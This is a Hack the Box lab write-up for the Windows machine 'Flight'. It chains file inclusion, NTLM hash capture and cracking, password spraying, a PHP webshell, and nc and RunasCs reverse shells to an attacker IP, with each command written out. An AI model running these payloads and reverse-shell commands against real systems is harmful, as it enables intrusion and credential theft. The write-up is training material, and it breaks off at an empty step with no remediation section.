# Flight

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Hard**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="895" height="655" alt="image" src="https://github.com/user-attachments/assets/ff5fb38f-4816-4900-8436-133c77fcf00a" />

2. The nmap scan reveals a bunch of open ports, including DNS (53), LDAP (389,3268) and Kerberos (88) meaning that this is a Domain Controller. We also see an open web server on port 80 that looks interesting. We add the domain to our `/etc/hosts` file and check out the website, which seems to just be static.

<img width="1008" height="842" alt="image" src="https://github.com/user-attachments/assets/b06483e9-7a32-4ccc-af01-d0e54784401d" />

3. As with all websites, we do subdomain enumeration to try to increase our attack surface using `ffuf`

`ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069`

<img width="821" height="457" alt="image" src="https://github.com/user-attachments/assets/210a9653-0474-46d5-b605-b901038ccd52" />

4. Subdomain enumeration reveals the school subdomain, so add this to our hosts file and explore the website. 

<img width="1541" height="979" alt="image" src="https://github.com/user-attachments/assets/0e9f5155-daf7-477c-8d1b-7ec4a8607ef9" />

5. It is a PHP website that passes the HTML file in the view parameter. We test for LFI and it appears the view parameter may be vulnerable to file inclusion

<img width="590" height="372" alt="image" src="https://github.com/user-attachments/assets/ccedb4e5-8fa9-4eea-bc8c-ff6e00a970cd" />

6. Confirmed file inclusion on view parameter by reading the error logs on `C:\xampp\apache\logs\error.log`

<img width="2257" height="1086" alt="image" src="https://github.com/user-attachments/assets/542b4363-0ed8-41b6-8f9f-5e1b88685309" />

7. Now, we run Responder on our local machine and attempt to connect to it using the file inclusion vulnerability. And we got a user hash!

`sudo Responder -I tun0 -dw`

<img width="829" height="412" alt="image" src="https://github.com/user-attachments/assets/88aa1dec-18c4-4d2c-81ea-6ae3f817371b" />

8. We attempt to crack the NTLMv2 hash offline using hashcat and we get svc_apache's plaintext password!

`hashcat -m 5600 svc_apache.hash /usr/share/wordlists/rockyou.txt`

<img width="823" height="448" alt="image" src="https://github.com/user-attachments/assets/31d1e11e-938d-4aa7-85ef-8942f0196647" />

9. Check credentials work with netexec and enumerate users with SMB login

`nxc smb flight.htb -u svc_apache -p $(cat ../user/svc_apache.pass) --users`

<img width="834" height="604" alt="image" src="https://github.com/user-attachments/assets/c6b2e79f-0067-4944-8c69-fd257fd892e6" />

10. With the users list, we do a password spraying attack with svc_apache's password to see if there's any password reuse on the domain. And we find the user S.Moon has the same password!

`nxc smb flight.htb -u usernames.list -p $(cat ../user/svc_apache.pass) --continue-on-success`

<img width="899" height="317" alt="image" src="https://github.com/user-attachments/assets/10f40940-27d3-4319-b605-f16189875589" />

11. User S.Moon has READ and WRITE permissions on Shared SMB share. Upload malicious files to steal user hashes using ntlm_theft.py

`nxc smb flight.htb -u S.Moon -p $(cat ../user/svc_apache.pass) --shares`

`python3 ~/tools/ntlm_theft/ntlm_theft.py -g all -s 10.10.14.226 -f theft`

<img width="894" height="251" alt="image" src="https://github.com/user-attachments/assets/ec6eb759-713d-4270-b007-b85b80456e8b" />

12. Log into Shared SMB share using smbclient and upload ntlm_theft.py files

`smbclient //flight.htb/Shared -U S.Moon`

<img width="755" height="463" alt="image" src="https://github.com/user-attachments/assets/a295ce20-60ba-4d1e-ba88-4aa7c657fec6" />

13. On Responder, we get c.bum's hash after upload! 

<img width="908" height="159" alt="image" src="https://github.com/user-attachments/assets/dc0ae8d6-c79a-4396-8b7c-2513feda9a9a" />

14. We will crack this hash offline and then check c.bum's permissions on SMB with Netexec

`hashcat -m 5600 c.bum.hash /usr/share/wordlists/rockyou.txt`

`nxc smb flight.htb -u c.bum -p $(cat c.bum.pass) --shares`

<img width="912" height="136" alt="image" src="https://github.com/user-attachments/assets/1fa4fc69-ebd8-45ad-908e-4009f2940692" />


15. We have write permissions on the Web share. We will put a test file into the school.flight.htb directory to see if we can access files in that folder from the file inclusion vulnerable view parameter

<img width="1433" height="311" alt="image" src="https://github.com/user-attachments/assets/a55bf107-fc72-4113-b7a0-d2ed9a189154" />

16. Yes, we can! We will now upload a PHP webshell to get code execution on the server. Success!

`<?php system($_REQUEST['cmd']); ?>`

<img width="531" height="120" alt="image" src="https://github.com/user-attachments/assets/fc1e80d3-aef7-42ed-8256-d3914b785b99" />

17. Now, we will upgrade to a proper reverse shell by uploading netcat and using that to connect to our attacker host

`http://school.flight.htb/webshell.php?cmd=nc.exe%20-e%20cmd.exe%20%2010.10.14.226%204444`

<img width="521" height="128" alt="image" src="https://github.com/user-attachments/assets/c4862cde-ab09-422c-aa92-318fe4344593" />

18. Now, we have a foothold on the machine! We will transfer over the RunasCs.exe file to the victim host so that we can run commands as C.Bum. 

`certutil -urlcache -f http://10.10.14.226:8000/RunasCs.exe runas.exe`

19. Then, run the script to get a remote shell as C.Bum and grab the user flag!

`runas.exe c.bum [PASS] -r 10.10.14.226:1234 cmd`

<img width="523" height="446" alt="image" src="https://github.com/user-attachments/assets/c4ef4a15-cb0f-4beb-9ed0-3cb30128fe04" />

20. 







